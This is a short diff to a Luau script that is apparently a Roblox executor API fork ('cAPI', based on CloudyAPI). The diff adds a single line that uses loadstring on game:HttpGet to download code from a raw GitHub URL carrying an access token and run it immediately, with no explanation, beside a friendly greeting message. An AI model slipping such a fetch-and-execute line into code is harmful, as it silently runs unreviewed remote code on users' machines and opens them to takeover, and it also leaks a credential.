@@ -4,6 +4,8 @@ local cAPI = {
 }
 table.freeze(cAPI)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luau-executors/cAPI/refs/heads/main/slideout.luau?token=GHSAT0AAAAAAC7BVHG25TLVUCKAOOEWTWZQZ6XJBMA"))()
+
 print("Thank you for using the cAPI fork based on CloudyAPI, currently running " .. cAPI.version)
 
 local libs = {
